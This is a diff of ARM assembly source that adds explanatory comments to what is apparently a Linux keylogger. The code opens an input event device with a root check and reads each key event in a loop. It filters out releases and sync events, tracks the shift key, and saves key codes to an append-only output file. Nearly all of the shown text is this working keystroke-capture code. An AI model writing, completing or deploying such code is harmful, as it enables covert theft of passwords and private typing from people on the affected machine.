@@ -3,50 +3,50 @@
 .section .text
 _start:
         @ open destination file
-        MOV R7, #5
+        MOV R7, #5         @ open syscall
         LDR R0, =dest
-        LDR R1, =02101
-        MOV R2, #420
+        LDR R1, =02101     @ O_WRONLY | O_CREAT | O_APPEND
+        MOV R2, #0644      @ S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH
         SVC #0
-        MOV R11, R0
+        MOV R11, R0        @ save returned file handler
 
         @ open source file
-        MOV R7, #5
+        MOV R7, #5         @ open syscall
         LDR R0, =source
-        MOV R1, #0
+        MOV R1, #0         @ O_RDONLY
         SVC #0
-        MOV R12, R0
+        MOV R12, R0        @ save returned file handler
 
         @ check root privileges for reading source file
-        LDR R1, =0xFFFFFFF3
+        LDR R1, =0xFFFFFFF3     @ error code for not being root
         CMP R0, R1
         BEQ error
 
 loop:
-        @ get next input event
-        MOV R7, #3
-        MOV R0, R12
+        @ get next input_event
+        MOV R7, #3              @ read syscall
+        MOV R0, R12             @ source file handler
         LDR R1, =input_event
-        MOV R2, #16
+        MOV R2, #16             @ get single input_event (16 bytes)
         SVC #0
 
-        @ save input.type
+        @ save input_event.type
         LDR R0, =input_event
         LDRH R0, [R0, #8]
 
-        @ skip if input.type == 0
+        @ skip if input_event.type == 0
         CMP R0, #0
         BEQ loop
 
-        @ skip if input.type == 4
+        @ skip if input_event.type == 4
         CMP R0, #4
         BEQ loop
 
-        @ save input.value
+        @ save input_event.value
         LDR R0, =input_event
         LDR R0, [R0, #12]
 
-        @ skip if input.value == 0 (release)
+        @ skip if input_event.value == 0 (release)
         CMP R0, #0
         BEQ checkShiftRelease
         B skipShiftReleaseCheck
@@ -69,7 +69,7 @@ releaseShift:
         B loop
 
 skipShiftReleaseCheck:
-        @ save input code (key)
+        @ save input_event.code (key)
         LDR R0, =input_event
         LDRH R0, [R0, #10]
 
